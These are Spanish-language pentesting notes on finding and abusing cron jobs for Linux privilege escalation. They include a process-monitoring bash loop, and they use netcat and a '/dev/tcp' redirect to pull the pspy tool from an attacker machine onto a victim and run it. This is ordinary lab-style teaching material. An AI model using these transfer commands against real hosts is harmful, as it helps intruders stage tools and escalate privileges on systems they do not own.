#Escalada #Cron

###### Definición:
>Una tarea Cron son tareas que se ejecutan en el sistema a intervalos regulares de tiempo

###### Enumeración
Tenemos dos opciones:
- Hacernos nuestro propio script llamado `procmon.sh`.
	```bash
#!/bin/bash

old_process=$(ps -eo user,command)

while true; do
    new_process=$(ps -eo user,command)
    diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -vE "procmon|command|kworker"
    old_process=$new_process
done
	```

- Herramienta automatizada `pspy`.
	Esta herramienta la obtendremos del siguiente GitHub https://github.com/DominicBreuker/pspy
	Para transferírnosla de una maquina a otra usaremos [[NETCAT]]: 
		- En la maquina atacante: `nc -nlvp <puerto> > pspy`.
		- En la maquina victima: `cat < /dev/tcp/<IP>/<puerto> > pspy`.
		Para comprobar si la transferencia a sido optima podemos comparar hashes con `md5sum pspy`.
	Para ejecutarla la damos permisos de ejecución `chmod +x pspy` y la ejecutamos con `./pspy`.


###### Explotación
Para la explotación esta tarea que se esta ejecutando tiene que ser modificable por nosotros y así poder adaptarla y obtener nuestra escalada de privilegios